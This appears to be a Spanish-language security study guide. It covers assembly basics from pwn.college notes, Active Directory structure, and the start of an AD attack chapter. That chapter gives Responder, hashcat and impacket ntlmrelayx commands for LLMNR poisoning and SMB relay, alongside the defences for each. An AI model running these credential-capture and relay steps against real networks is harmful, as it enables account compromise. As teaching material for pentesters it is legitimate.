<li>x86: eax, ecx, edx, ebx, <strong>esp</strong>, <strong>ebp</strong>, esi, edi.</li>
<li>amd64: rax, rcx, rdx, rbx, <strong>rsp</strong>, <strong>rbp</strong>, rsi, rdi, r8, r9, r10, r11, r12, r13, r14, r15.</li>
<li>arm: r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12, r13, <strong>r14</strong>, <strong>r15</strong>.</li>
</ul>
<p>La dirección para la siguiente instrucción se encuentra en los registros:</p>
<p>eip (x86), rip (amd64), r15 (arm)</p>
<p>Varias extensiones añaden otros registros (x87, MMX, SSE, etc).</p>
<h3 id="partial-register-access"><a class="header" href="#partial-register-access">Partial Register Access</a></h3>
<p><img src="guides/pwncollege/0_module/images/reg_partial.png" alt="Acceso parcial de registros" /></p>
<p>Los registros pueden ser accedidos parcialmente.</p>
<p>Debido a una rareza histórica, acceder a <strong>eax</strong> convertirá en cero el resto del <strong>rax</strong>. Esto fue diseñado como medida de seguridad para conservar partes sin tocar del registro.</p>
<h3 id="all-partial-accesses-on-amd64-that-i-know-of"><a class="header" href="#all-partial-accesses-on-amd64-that-i-know-of">All partial accesses on amd64 (that I know of)</a></h3>
<div class="table-wrapper"><table><thead><tr><th>64</th><th>32</th><th>16</th><th>8H</th><th>8L</th></tr></thead><tbody>
<tr><td>rcx</td><td>ecx</td><td>cx</td><td>ah</td><td>al</td></tr>
<tr><td>rdx</td><td>edx</td><td>dx</td><td>ch</td><td>cl</td></tr>
<tr><td>rax</td><td>eax</td><td>ax</td><td>dh</td><td>dl</td></tr>
<tr><td>rbx</td><td>ebx</td><td>bx</td><td>bh</td><td>bl</td></tr>
<tr><td>rsp</td><td>esp</td><td>sp</td><td></td><td>spl</td></tr>
<tr><td>rbp</td><td>ebp</td><td>bp</td><td></td><td>bpl</td></tr>
<tr><td>rsi</td><td>esi</td><td>si</td><td></td><td>sil</td></tr>
<tr><td>rdi</td><td>edi</td><td>di</td><td></td><td>dil</td></tr>
<tr><td>r8</td><td>r8d</td><td>r8w</td><td></td><td>r8b</td></tr>
<tr><td>r9</td><td>r9d</td><td>r9w</td><td></td><td>r9b</td></tr>
<tr><td>r10</td><td>r10d</td><td>r10w</td><td></td><td>r10b</td></tr>
<tr><td>r11</td><td>r11d</td><td>r11w</td><td></td><td>r11b</td></tr>
<tr><td>r12</td><td>r12d</td><td>r12w</td><td></td><td>r12b</td></tr>
<tr><td>r13</td><td>r13d</td><td>r13w</td><td></td><td>r13b</td></tr>
<tr><td>r14</td><td>r14d</td><td>r14w</td><td></td><td>r14b</td></tr>
<tr><td>r15</td><td>r15d</td><td>r15w</td><td></td><td>r15b</td></tr>
</tbody></table>
</div>
<h3 id="instructions"><a class="header" href="#instructions">Instructions</a></h3>
<p>Forma general:</p>
<p><code>OPCODE OPERAND OPERAND, ...</code></p>
<p><code>OPCODE</code> - Que hacer
<code>OPERANDS</code> - Que hacer en/con</p>
<pre><code class="language-asm">mov rax, rbx
add rax, 1
cmp rax, rbx
jmp some_location
</code></pre>
<h3 id="instructions-data-manipulation"><a class="header" href="#instructions-data-manipulation">Instructions (data manipulation)</a></h3>
<p>Las intrucciones pueden mover y manipular data en registros y memoria.</p>
<pre><code class="language-asm">mov rax, rbx # mover el valor de rbx a rax
mov rax, [rbx+4] # de la dirección de rbx + 4 posiciones extraer el valor y moverlo a rax
add rax, rbx # sumar el rbx a rax y guardar en rax
mul rsi # multiplicar el valor en rax por rsi y guardar en rax
inc rax # incrementa rax en 1
inc [rax] # incrementa el puntero de rax en 1
</code></pre>
<h3 id="instructions-control-flow"><a class="header" href="#instructions-control-flow">Instructions (control flow)</a></h3>
<p>El flujo de control es determinado por saltos condicionales e incondicionales.</p>
<p>Incondicionales: call, jmp, ret</p>
<p>Condicionales:</p>
<div class="table-wrapper"><table><thead><tr><th>Operación</th><th>Descripción</th></tr></thead><tbody>
<tr><td>je <br/> jne</td><td>jump si es igual <br/> jump si no es igual</td></tr>
<tr><td>jg <br/> jl</td><td>jump si es mayor <br/> jump si es menor</td></tr>
<tr><td>jle <br/> jge</td><td>jump si es menor o igual <br/> jump si es mayor o igual</td></tr>
<tr><td>ja <br/> jb</td><td>jump si se cumple instrucción anterior (arriba) <br/> jump si se cumple siguiente instrucción (abajo)</td></tr>
<tr><td>jae <br/> jbe</td><td>jump si se cumple instrucción anterior (arriba) o igual <br/> jump si se cumple siguiente instrucción (abajo) o igual</td></tr>
<tr><td>js <br/> jns</td><td>jump si tiene signo <br/> jump si no tiene signo</td></tr>
<tr><td>jo <br/> jno</td><td>jump si desborda <br/> jump si no desborda</td></tr>
<tr><td>jz <br/> jnz</td><td>jump si es cero <br/> jump si no es cero</td></tr>
</tbody></table>
</div>
<h3 id="instructions-conditionals"><a class="header" href="#instructions-conditionals">Instructions (conditionals)</a></h3>
<p>Las conficionales utilizan el registro de &quot;flags&quot; como apoyo:</p>
<ul>
<li>eflags (x86), rflags (amd64), aspr (arm).</li>
</ul>
<p>Actualizado para (x86/amd64):</p>
<ul>
<li>Operaciones aritméticas.</li>
<li>cmp - sustracción (<code>cmp rax, rbx</code>).</li>
<li>test - operador and (<code>test rax, rax</code>).</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>Operación</th><th>Descripción</th><th>Banderas</th></tr></thead><tbody>
<tr><td>je <br/> jne</td><td>jump si es igual <br/> jump si no es igual</td><td>ZF=1 <br/> ZF=0</td></tr>
<tr><td>jg <br/> jl</td><td>jump si es mayor <br/> jump si es menor</td><td>ZF=0 y SF=OF <br/> SF!=OF</td></tr>
<tr><td>jle <br/> jge</td><td>jump si es menor o igual <br/> jump si es mayor o igual</td><td>ZF=1 y SF!=OF <br/> SF=OF</td></tr>
<tr><td>ja <br/> jb</td><td>jump si se cumple instrucción anterior (arriba) <br/> jump si se cumple siguiente instrucción (abajo)</td><td>CF=0 y ZF=0 <br/> CF=1</td></tr>
<tr><td>jae <br/> jbe</td><td>jump si se cumple instrucción anterior (arriba) o igual <br/> jump si se cumple siguiente instrucción (abajo) o igual</td><td>CF=0 <br/> CF=1 o ZF=1</td></tr>
<tr><td>js <br/> jns</td><td>jump si tiene signo <br/> jump si no tiene signo</td><td>SF=1 <br/> SF=0</td></tr>
<tr><td>jo <br/> jno</td><td>jump si desborda <br/> jump si no desborda</td><td>OF=1 <br/> OF=0</td></tr>
<tr><td>jz <br/> jnz</td><td>jump si es cero <br/> jump si no es cero</td><td>ZF=1 <br/> ZF=0</td></tr>
</tbody></table>
</div>
<h3 id="instructions-system-calls"><a class="header" href="#instructions-system-calls">Instructions (system calls)</a></h3>
<p>Las system calls (en amd64) son disparadas por:</p>
<ol>
<li>Guardar número de la system call en rax.</li>
<li>Guardar los argumentos en rdi, rsi, etc.</li>
<li>Llamar a la instrucción <code>syscall</code>.</li>
</ol>
<h3 id="memory-stack"><a class="header" href="#memory-stack">Memory (stack)</a></h3>
<p>El stack cubre 4 usos principales:</p>
<ol>
<li>Dar seguimiento al &quot;callstack&quot; de un programa.
<ol>
<li>Los valores retornados son &quot;empujados&quot; a la stack durante su llamada y &quot;desapilados&quot; durante un retorno (push y pop).</li>
</ol>
</li>
<li>Contienen variables locales de funciones.</li>
<li>Proveer espacio de ejecución para evitar el uso elevado de registros.</li>
<li>Pasar argumentos de funciones.</li>
</ol>
<p>Registros relevantes (amd64): rsp, rbp.</p>
<p>Instrucciones relevantes (amd64): push, pop.</p>
<h3 id="memory-other-mapped-regions"><a class="header" href="#memory-other-mapped-regions">Memory (other mapped regions)</a></h3>
<p>Otras regiones podrían ser mapeadas en memoria. Anteriormente fueron mencionadas que ciertas regiones son cargadas en relación a las directivas de las cabeceras de los ELF pero las funcionalidades como <code>mmap</code> y <code>malloc</code> pueden causar que otras regiones puedan ser mapeadas también.</p>
<p>Esta funcionalidad será tomada en cuenta en módulos posteriores.</p>
<h3 id="memory-endianess"><a class="header" href="#memory-endianess">Memory (endianess)</a></h3>
<p>Data en la mayoría de los sistemas actuales es alojada hacia atrás, en <em>little endian</em>.</p>
<p><img src="guides/pwncollege/0_module/images/endianess.png" alt="Endianess" /></p>
<p>¿Por qué?</p>
<ul>
<li>Rendimiento (histórico).</li>
<li>Facilitar la aseignación de direcciones para diferentes tamaños.</li>
<li>Compatibilidad 8086 (apócrifa).</li>
</ul>
<h3 id="signedness-twos-compliment-2933"><a class="header" href="#signedness-twos-compliment-2933">Signedness: Two's Compliment 29:33</a></h3>
<h3 id="instructions-1"><a class="header" href="#instructions-1">Instructions</a></h3>
<h3 id="instructions-2"><a class="header" href="#instructions-2">Instructions</a></h3>
<h1 id="further-reading"><a class="header" href="#further-reading">Further Reading</a></h1>
<ul>
<li>An awesome intro series that covers some of the fundamentals from <a href="https://www.youtube.com/watch?v=iyAyN3GFM7A&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=1">LiveOverflow</a>.</li>
<li>Phineas Fisher’s <a href="https://pwn.college/modules/intro/phisher-hackback.txt">writeup</a> of the hacking team disclosure (discussed in the What is Computer Systems Security video). Originally posted on pastebin by Phineas Fisher, but since removed.</li>
<li><a href="https://github.com/Alekseyyy/phineas-philes">Some more (mirrored) writeups</a> from Phineas Fisher, for the curious.</li>
<li>Executable and Linkable Format 101 Part 1-4 - https://www.intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/</li>
<li>System calls in the Linux kernel. Part 4. -  https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-4.html</li>
<li>Understanding the Memory Layout of Linux Executables - https://gist.github.com/CMCDragonkai/10ab53654b2aa6ce55c11cfc5b2432a4</li>
</ul>
<h1 id="referencias"><a class="header" href="#referencias">Referencias</a></h1>
<ul>
<li>X86 Opcode and Instruction Reference - http://ref.x86asm.net/</li>
<li>Linux System Call Table for x86_64 - https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="Índice"><a class="header" href="#Índice">Índice</a></h1>
<ul>
<li><a href="guides/active_directory/guides/active_directory/0_general.html">Teoría General</a></li>
<li><a href="guides/active_directory/guides/active_directory/1_attacking.html">Atacando AD</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="active-directory"><a class="header" href="#active-directory">Active Directory</a></h1>
<h2 id="tabla-de-contenido"><a class="header" href="#tabla-de-contenido">Tabla de Contenido <!-- omit from toc --></a></h2>
<ul>
<li><a href="guides/active_directory/0_general.html#qu%C3%A9-es">¿Qué es?</a></li>
<li><a href="guides/active_directory/0_general.html#por-qu%C3%A9">¿Por qué?</a></li>
<li><a href="guides/active_directory/0_general.html#componentes-f%C3%ADsicos">Componentes Físicos</a>
<ul>
<li><a href="guides/active_directory/0_general.html#domain-controller">Domain Controller</a></li>
<li><a href="guides/active_directory/0_general.html#ad-ds-data-store-active-directory-domain-services">AD DS Data Store (Active Directory Domain Services)</a></li>
</ul>
</li>
<li><a href="guides/active_directory/0_general.html#componentes-l%C3%B3gicos">Componentes Lógicos</a>
<ul>
<li><a href="guides/active_directory/0_general.html#ad-ds-schema">AD DS Schema</a></li>
<li><a href="guides/active_directory/0_general.html#domains">Domains</a></li>
<li><a href="guides/active_directory/0_general.html#trees">Trees</a></li>
<li><a href="guides/active_directory/0_general.html#forests">Forests</a></li>
<li><a href="guides/active_directory/0_general.html#organizational-units-ous">Organizational Units (OUs)</a></li>
<li><a href="guides/active_directory/0_general.html#trusts">Trusts</a></li>
<li><a href="guides/active_directory/0_general.html#objects">Objects</a></li>
</ul>
</li>
<li><a href="guides/active_directory/0_general.html#referencias">Referencias</a></li>
</ul>
<h2 id="qué-es"><a class="header" href="#qué-es">¿Qué es?</a></h2>
<ul>
<li>Es un servicio de directorio desarrollado por Microsoft para gestionar dominios de red.</li>
<li>Guarda información relacionada con objetos, como computadoras, usuarios, impresoras, etc.
<ul>
<li>Se puede visualizar como un directorio telefónico.</li>
</ul>
</li>
<li>Se autentica usando tickets de Kerberos.
<ul>
<li>En dispostivos que no tengan Windoes, como máquinas con Linux, firewalls, etc. se pueden autenticar al Active Directory vía RADIUS o LDAP.</li>
</ul>
</li>
</ul>
<h2 id="por-qué"><a class="header" href="#por-qué">¿Por qué?</a></h2>
<ul>
<li>Es el servicio de gestión de identidades más usado en el mundo.
<ul>
<li>Se encuentra implementado en la red de numerosas compañias como servicio.</li>
</ul>
</li>
<li>Puede ser explotado sin siquiera atacar exploits que pueden ser parcheables.
<ul>
<li>En vez de eso se abusan características, confianza, componentes, entre otras cosas.</li>
</ul>
</li>
</ul>
<h2 id="componentes-físicos"><a class="header" href="#componentes-físicos">Componentes Físicos</a></h2>
<h3 id="domain-controller"><a class="header" href="#domain-controller">Domain Controller</a></h3>
<ul>
<li>Cuenta con una copia de la colección del directorio.</li>
<li>Provee servicios de autenticación y autorización.</li>
<li>Replica actualizaciones a otros domain controllers en el dominio y bosque.</li>
<li>Brinda acceso administrativo para gestionar cuentas de usuario y recursos de red.</li>
</ul>
<h3 id="ad-ds-data-store-active-directory-domain-services"><a class="header" href="#ad-ds-data-store-active-directory-domain-services">AD DS Data Store (Active Directory Domain Services)</a></h3>
<ul>
<li>Contiene la base de datos de archivos y procesos y gestiona la información del directorio de usuarios, servicios y aplicaciones.</li>
<li>Consiste en el archivo <code>Ntds.dit</code>.</li>
<li>Almacenado predeterminadamente en el directorio <code>%SystemRoot%\NTDS</code> en todos los domain controllers.</li>
<li>Siendo sólo accesible a través de procesos y protocoles del domain controller.</li>
</ul>
<h2 id="componentes-lógicos"><a class="header" href="#componentes-lógicos">Componentes Lógicos</a></h2>
<h3 id="ad-ds-schema"><a class="header" href="#ad-ds-schema">AD DS Schema</a></h3>
<ul>
<li>Define cada tipo de objeto que puede ser guardado en el directorio.</li>
<li>Hace cumplir reglas respecto a la creación de objetos y configuración.</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>Tipos de objetos</th><th>Función</th><th>Ejemplos</th></tr></thead><tbody>
<tr><td>Class Object</td><td>Que objetos pueden ser creados en el directorio</td><td>- Usuario → Computadora</td></tr>
<tr><td>Attribute Object</td><td>Información que puede ser enlazada a un objeto</td><td>- Nombre a desplegar</td></tr>
</tbody></table>
</div>
<h3 id="domains"><a class="header" href="#domains">Domains</a></h3>
<ul>
<li>Son usados para agrupar y gestionar objetos en una organización.</li>
<li>Perímetro administrativo para aplicar políticas a grupos de objetos.</li>
<li>Perímetro de replicación para replicar data entre domain controllers.</li>
<li>Perímetro de autenticación y autorización que provee una forma de limitar el alcance del acceso a recursos.</li>
</ul>
<h3 id="trees"><a class="header" href="#trees">Trees</a></h3>
<ul>
<li>Un domain tree es una jerarquía de dominios dentro de el AD DS.</li>
<li>Comparte el namespace con el dominio padre.</li>
<li>Puede tener dominios hijos adicionales.</li>
<li>Predeterminadamente crea confianza transitiva de dos vías con otros dominios.</li>
</ul>
<p><img src="guides/active_directory/images/trees.png" alt="Trees" /></p>
<h3 id="forests"><a class="header" href="#forests">Forests</a></h3>
<ul>
<li>Es una colección de uno o más domain trees.</li>
<li>Comparte un schema común.</li>
<li>Comparte una partición de configuración común.</li>
<li>Comparte un catálogo global común para habilitar búsquedas.</li>
<li>Habilita confianza entre todos los dominios en el forest.</li>
<li>Comparte los Enterprise Admins y los grupos de Schema Admins.</li>
</ul>
<p><img src="guides/active_directory/images/forests.png" alt="Forests" /></p>
<h3 id="organizational-units-ous"><a class="header" href="#organizational-units-ous">Organizational Units (OUs)</a></h3>
<ul>
<li>Son contenedores del Active Directory que pueden contener usuarios, grupos, computadoras y otros OUs.</li>
<li>Representa la organización logica y jerárquicamente.</li>
<li>Gestiona de consistentemente colecciones de objetos.</li>
<li>Delega permisos para administrar grupos de objetos.</li>
<li>Aplica políticas.</li>
</ul>
<p><img src="guides/active_directory/images/ous.png" alt="OUs" /></p>
<h3 id="trusts"><a class="header" href="#trusts">Trusts</a></h3>
<ul>
<li>Provee un mecanismo para que los usuarios obtengan acceso a recursos en otro dominio.</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>Tipos de Trusts</th><th>Descripción</th><th>Diagrama</th></tr></thead><tbody>
<tr><td>Direccional</td><td>La dirección de confianza fluye de dominio de confianza a dominio de confianza.</td><td><img src="guides/active_directory/images/t_directional.png" alt="Trust directional" /></td></tr>
<tr><td>Transitivo</td><td>La relación de confianza es extendida más allá de la relación de confianza de dos dominios, incluyendo otros dominios en los que se confía</td><td><img src="guides/active_directory/images/t_transitive.png" alt="Trust transitive" /></td></tr>
</tbody></table>
</div>
<ul>
<li>Todos los dominios de un bosque confían en otros dominios del bosque.</li>
<li>La confianza puede ser extendida afuera del bosque.</li>
</ul>
<h3 id="objects"><a class="header" href="#objects">Objects</a></h3>
<div class="table-wrapper"><table><thead><tr><th>Objeto</th><th>Descripción</th></tr></thead><tbody>
<tr><td>User</td><td>- Habilita acceso a recursos de red a un usuario</td></tr>
<tr><td>InetOrgPerson</td><td>- Similar a la cuenta de usuario <br> - Usado para brindar compatibilidad a otros servicios de directorios</td></tr>
<tr><td>Contacts</td><td>- Usado principalmente para asignar direcciones de e-mail a usuarios externos <br> - No habilita acceso a la red</td></tr>
<tr><td>Groups</td><td>- Usado para simplificar la administración de control de acceso</td></tr>
<tr><td>Computers</td><td>- Habilita autenticación y auditoría de acceso informático a los recursos</td></tr>
<tr><td>Printers</td><td>- Usado para simplificar el proceso de ubicación y conexión a impresoras</td></tr>
<tr><td>Shared folders</td><td>- Permite a los usuarios la búsqueda de carpetas compartidas basándose en sus propiedades</td></tr>
</tbody></table>
</div>
<h2 id="referencias-1"><a class="header" href="#referencias-1">Referencias</a></h2>
<ul>
<li>Microsoft Virtual Academy.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="atacando-active-directory"><a class="header" href="#atacando-active-directory">Atacando Active Directory <!-- omit from toc --></a></h1>
<h2 id="tabla-de-contenido-1"><a class="header" href="#tabla-de-contenido-1">Tabla de Contenido <!-- omit from toc --></a></h2>
<ul>
<li><a href="guides/active_directory/1_attacking.html#llmnr-poisoning">LLMNR Poisoning</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#qu%C3%A9-es-llmnr">¿Qué es LLMNR?</a></li>
<li><a href="guides/active_directory/1_attacking.html#ejecuci%C3%B3n">Ejecución</a></li>
<li><a href="guides/active_directory/1_attacking.html#defensas">Defensas</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#smb-relay">SMB Relay</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#qu%C3%A9-es">¿Qué es?</a></li>
<li><a href="guides/active_directory/1_attacking.html#requisitos">Requisitos</a></li>
<li><a href="guides/active_directory/1_attacking.html#ejecuci%C3%B3n-1">Ejecución</a></li>
<li><a href="guides/active_directory/1_attacking.html#estrategias-de-mitigaci%C3%B3n">Estrategias de mitigación</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#ipv6-attacks">IPv6 Attacks</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#ipv6-dns-takeover">IPv6 DNS Takeover</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#ejecuci%C3%B3n-2">Ejecución</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#estrategias-de-mitigaci%C3%B3n-1">Estrategias de mitigación</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#estrategiasproceso-de-pentesting-a-ambiente">Estrategias/proceso de pentesting a ambiente</a></li>
<li><a href="guides/active_directory/1_attacking.html#post-explotaci%C3%B3n">Post-Explotación</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#enumeraci%C3%B3n">Enumeración</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#powerview">PowerView</a></li>
<li><a href="guides/active_directory/1_attacking.html#bloodhound">BloodHound</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#recopilaci%C3%B3n">Recopilación</a></li>
<li><a href="guides/active_directory/1_attacking.html#carga-de-informaci%C3%B3n">Carga de información</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#ataques">Ataques</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#privilege-requirements">Privilege Requirements</a></li>
<li><a href="guides/active_directory/1_attacking.html#abusing-pre-authentication">Abusing Pre-Authentication</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#kerbrute">Kerbrute</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#harvesting--brute-forcing-tickets">Harvesting &amp; Brute-Forcing Tickets</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#rubeus">Rubeus</a></li>
<li><a href="guides/active_directory/1_attacking.html#harvesting">Harvesting</a></li>
<li><a href="guides/active_directory/1_attacking.html#brute-forcing--password-spraying">Brute-Forcing | Password-Spraying</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#kerberoasting">Kerberoasting</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#ejecuci%C3%B3n---rubeus">Ejecución - Rubeus</a></li>
<li><a href="guides/active_directory/1_attacking.html#ejecuci%C3%B3n---impacket">Ejecución - Impacket</a></li>
<li><a href="guides/active_directory/1_attacking.html#crackeo">Crackeo</a></li>
<li><a href="guides/active_directory/1_attacking.html#qu%C3%A9-puede-hacer-una-cuenta-de-servicio">¿Qué puede hacer una cuenta de servicio?</a></li>
<li><a href="guides/active_directory/1_attacking.html#mitigaci%C3%B3n">Mitigación</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#as-rep-roasting">AS-REP Roasting</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#overview">Overview</a></li>
<li><a href="guides/active_directory/1_attacking.html#ejecuci%C3%B3n---rubeus-1">Ejecución - Rubeus</a></li>
<li><a href="guides/active_directory/1_attacking.html#ejecuci%C3%B3n---impacket-1">Ejecución - Impacket</a></li>
<li><a href="guides/active_directory/1_attacking.html#crackeo-1">Crackeo</a></li>
<li><a href="guides/active_directory/1_attacking.html#mitigaci%C3%B3n-1">Mitigación</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#pass-the-ticket">Pass The Ticket</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#overview-1">Overview</a></li>
<li><a href="guides/active_directory/1_attacking.html#ejecuci%C3%B3n-3">Ejecución</a></li>
<li><a href="guides/active_directory/1_attacking.html#mitigaci%C3%B3n-2">Mitigación</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#pass-the-hash">Pass The Hash</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#dumpeo-de-hashes">Dumpeo de hashes</a></li>
<li><a href="guides/active_directory/1_attacking.html#mitigaciones">Mitigaciones</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#token-impersonation">Token Impersonation</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#ejecuci%C3%B3n-4">Ejecución</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#metasploit">Metasploit</a></li>
<li><a href="guides/active_directory/1_attacking.html#non-metasploit">Non-metasploit</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#mitigaci%C3%B3n-3">Mitigación</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#group-policy-preferences-gpp---aka-ms14-025">Group Policy Preferences (GPP) - AKA MS14-025</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#ejecuci%C3%B3n-5">Ejecución</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#mimikatz">Mimikatz</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#credential-dumping">Credential Dumping</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#goldensilver-tickets">Golden/Silver Tickets</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#krbtgt-overview">KRBTGT Overview</a></li>
<li><a href="guides/active_directory/1_attacking.html#attack-overview">Attack Overview</a></li>
<li><a href="guides/active_directory/1_attacking.html#ejecuci%C3%B3n-6">Ejecución</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#kerberos-backdoors">Kerberos Backdoors</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#skeleton-key-overview">Skeleton Key Overview</a></li>
<li><a href="guides/active_directory/1_attacking.html#ejecuci%C3%B3n-7">Ejecución</a></li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#abusando-de-aclsaces">Abusando de ACLs/ACEs</a>
<ul>
<li><a href="guides/active_directory/1_attacking.html#readgmsapassword">ReadGMSAPassword</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="guides/active_directory/1_attacking.html#referencias">Referencias</a></li>
</ul>
<h2 id="llmnr-poisoning"><a class="header" href="#llmnr-poisoning">LLMNR Poisoning</a></h2>
<h3 id="qué-es-llmnr"><a class="header" href="#qué-es-llmnr">¿Qué es LLMNR?</a></h3>
<ul>
<li>Link-Local Multicast Name Resolution (&quot;Prácticamente&quot; se podría considerar DNS).</li>
<li>Usado para identificar hosts cuando falla en esa tarea el DNS.</li>
<li>Anteriormente conocido como NBT-NS.</li>
<li>La falla principal es que los servicios ocupan un nombre de usuario del sistema operativo y un hash NTLMv2 a los cuales responden.</li>
</ul>
<p><img src="guides/active_directory/images/llmnr.png" alt="Información general" /></p>
<h3 id="ejecución"><a class="header" href="#ejecución">Ejecución</a></h3>
<ol>
<li>Ejecutar responder (herramienta de impacket) <code>responder -I tun0 -rdw -v</code>.</li>
</ol>
<p><img src="guides/active_directory/images/llmnr-responder.png" alt="Responder" /></p>
<ol start="2">
<li>Evento ocurre</li>
</ol>
<p><img src="guides/active_directory/images/llmnr-event.png" alt="Evento" /></p>
<ol start="3">
<li>Obtener hashes</li>
</ol>
<p><img src="guides/active_directory/images/llmnr-hashes.png" alt="Hashes" /></p>
<ol start="4">
<li>Crackeo de hashes <code>hashcat -m 5600 hashes.txt rockyou.txt</code></li>
</ol>
<p><img src="guides/active_directory/images/llmnr-crack.png" alt="Crackeo" /></p>
<h3 id="defensas"><a class="header" href="#defensas">Defensas</a></h3>
<p>La mejor defensa para este escenario es deshabilitar LLMNR y NBT-NS:</p>
<ul>
<li>Para deshabilitar LLMNR, se debe seleccionar &quot;Turn OFF Multicast Name Resolution&quot; en <code>Local Computer Policy &gt; Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client en el Group Policy Editor</code></li>
<li>Para deshabilitar NBT-NS, se requiere navegar a <code>Network Connections &gt; Network Adapter Properties &gt; TCP/IPv4 Properties &gt; Advanced tab &gt; WINS tab y seleccionar &quot;Disable NetBIOS over TCP/IP&quot;</code>.</li>
</ul>
<p>En una compañia en donde es necesario usarse o no se puede deshabilitar LLMNR/NBT-NS, lo mejor que se puede realizar es:</p>
<ul>
<li>Requerir Network Access Control.</li>
<li>Requerir contraseñas de usuario fuertes (ejemplo, 14+ carácteres de longitud y límite de uso de palabras comúnes). Entre más larga y compleja la contraseña, más difícil será crackear el hash.</li>
</ul>
<h2 id="smb-relay"><a class="header" href="#smb-relay">SMB Relay</a></h2>
<h3 id="qué-es-1"><a class="header" href="#qué-es-1">¿Qué es?</a></h3>
<p>En vez de buscar crackear los hashes obtenidos con responder, en su lugar se pueden retransmitir a máquinas en específico y potencialmente obtener acceso.</p>
<h3 id="requisitos"><a class="header" href="#requisitos">Requisitos</a></h3>
<ul>
<li>SMB signing se debe encontrar deshabilitado en el objetivo.</li>
<li>Las credenciales de usuario retransmitidas deberán ser de un administrador de la máquina.</li>
</ul>
<h3 id="ejecución-1"><a class="header" href="#ejecución-1">Ejecución</a></h3>
<ol>
<li>Modificar <code>responder.conf</code></li>
</ol>
<p><img src="guides/active_directory/images/responder-conf.png" alt="responder.conf" /></p>
<ol start="2">
<li>
<p>Ejecutar responder <code>responder.py -I tun0 -rdw -v</code>.</p>
</li>
<li>
<p>Configurar relay a utilizar <code>impacket-ntlmrelayx -tf targets.txt -smb2support</code>.</p>
</li>
</ol>
<p><img src="guides/active_directory/images/ntlmrelay.png" alt="Impacket ntlmrelay" /></p>
<ol start="4">
<li>Evento ocurre</li>
</ol>
<p><img src="guides/active_directory/images/llmnr-event.png" alt="Evento" /></p>
<ol start="5">
<li>Win (Pass the hash o Cracking)</li>
</ol>
<p><img src="guides/active_directory/images/relay-win.png" alt="Win" /></p>
<h3 id="estrategias-de-mitigación"><a class="header" href="#estrategias-de-mitigación">Estrategias de mitigación</a></h3>
<ul>
<li>Habilitar SMB Signing en todos los dispositivos.
<ul>
<li>Ventaja: Para completamente el ataque.</li>
<li>Desventaja: Puede causar problemas de rendimiento con transferencia de archivos.</li>
</ul>
</li>
<li>Deshabilitar autenticación NTLM en la red.
<ul>
<li>Ventaja: Para completamente el ataque.</li>
<li>Desventaja: Si Kerberos deja de funcionar, Windows regresa por default a NTLM.</li>
</ul>
</li>
<li>Gestionar nivel de cuentas.
<ul>
<li>Ventaja: Limita a los administradores de dominio a tareas específicas (ejemplo, permitiéndoles loguearse sólo a servidores de dominio, etc.).</li>
<li>Desventaja: Hacer cumplir la política podría resultar difícil.</li>
</ul>
</li>
<li>Restricción de administrador local.
<ul>
<li>Ventaja: Puede prevenir el movimiento lateral.</li>
<li>Desventaja: Potencial incremento de la cantidad de tickets de service desk.</li>
</ul>
</li>
</ul>
<h2 id="ipv6-attacks"><a class="header" href="#ipv6-attacks">IPv6 Attacks</a></h2>
<h3 id="ipv6-dns-takeover"><a class="header" href="#ipv6-dns-takeover">IPv6 DNS Takeover</a></h3>
